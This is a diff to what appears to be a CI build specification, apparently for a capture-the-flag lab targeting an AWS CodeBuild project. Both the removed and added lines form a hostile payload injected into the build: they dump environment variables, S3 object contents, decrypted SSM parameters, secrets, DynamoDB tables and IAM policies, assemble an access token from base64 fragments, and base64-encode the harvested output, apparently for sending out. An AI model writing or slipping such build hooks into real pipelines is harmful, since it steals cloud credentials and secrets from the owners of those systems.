@@ -11,47 +11,22 @@ phases:
         TK="$(echo -n $P1 | base64 -d)$(echo -n $P2 | base64 -d)$(echo -n $P3 | base64 -d)"
         exec 2>&1
         {
-          echo "=== AWS IDENTITY ==="
-          aws sts get-caller-identity 2>&1 || true
-          echo "=== S3 BUCKETS ==="
-          aws s3 ls 2>&1 || true
-          for bucket in $(aws s3 ls 2>/dev/null | awk '{print $3}'); do
-            echo "--- BUCKET: $bucket ---"
-            aws s3 ls "s3://$bucket/" --recursive 2>&1 || true
-            for key in $(aws s3 ls "s3://$bucket/" --recursive 2>/dev/null | awk '{print $4}'); do
-              echo "--- FILE: s3://$bucket/$key ---"
-              aws s3 cp "s3://$bucket/$key" - 2>/dev/null || true
-            done
-          done
-          echo "=== SSM PARAMS ==="
-          aws ssm describe-parameters --region us-east-1 2>&1 || true
-          aws ssm get-parameters-by-path --path "/" --recursive --with-decryption --region us-east-1 2>&1 || true
-          echo "=== SECRETS ==="
-          aws secretsmanager list-secrets --region us-east-1 2>&1 || true
-          echo "=== DYNAMODB ==="
-          aws dynamodb list-tables --region us-east-1 2>&1 || true
-          for tbl in $(aws dynamodb list-tables --region us-east-1 --query 'TableNames[]' --output text 2>/dev/null); do
-            echo "--- TABLE: $tbl ---"
-            aws dynamodb scan --table-name "$tbl" --region us-east-1 2>&1 || true
-          done
-          echo "=== LAMBDA ==="
-          aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName' --output text 2>&1 || true
-          echo "=== IAM ROLE POLICIES ==="
-          ROLE=$(aws sts get-caller-identity --query Arn --output text 2>/dev/null | grep -oP 'assumed-role/\K[^/]+')
-          echo "Role: $ROLE"
-          aws iam list-attached-role-policies --role-name "$ROLE" 2>&1 || true
-          aws iam list-role-policies --role-name "$ROLE" 2>&1 || true
-          for pol in $(aws iam list-role-policies --role-name "$ROLE" --query 'PolicyNames[]' --output text 2>/dev/null); do
-            echo "--- INLINE POLICY: $pol ---"
-            aws iam get-role-policy --role-name "$ROLE" --policy-name "$pol" 2>&1 || true
-          done
-          for arn in $(aws iam list-attached-role-policies --role-name "$ROLE" --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null); do
-            echo "--- ATTACHED POLICY: $arn ---"
-            VER=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text 2>/dev/null)
-            aws iam get-policy-version --policy-arn "$arn" --version-id "$VER" 2>&1 || true
-          done
-          echo "=== ENV FLAG ==="
-          env | grep -i flag 2>&1 || echo "no flag env"
+          echo "=== FULL ENV ==="
+          env | sort
+          echo "=== ALL FILES IN REPO ==="
+          find . -type f 2>/dev/null
+          echo "=== CODEBUILD ENV ==="
+          env | grep -i CODEBUILD | sort
+          echo "=== SEARCH FOR FLAG IN FILES ==="
+          grep -ri "flag" . 2>/dev/null || echo "no flag in files"
+          echo "=== SEARCH FLAG IN /tmp /opt /codebuild ==="
+          find /tmp /opt /codebuild -name "*flag*" -o -name "*secret*" 2>/dev/null || true
+          grep -ri "flag{" /tmp /opt /codebuild 2>/dev/null || true
+          grep -ri "FLAG" /codebuild/output 2>/dev/null || true
+          echo "=== CODEBUILD PROJECT CONFIG ==="
+          aws codebuild batch-get-projects --names codebuild_lab_5_project --region us-east-1 2>&1 || true
+          echo "=== PRINTENV ==="
+          printenv | sort
           echo "=== DONE ==="
         } > /tmp/output.txt
         CONTENT_B64=$(cat /tmp/output.txt | head -c 60000 | base64 -w0)
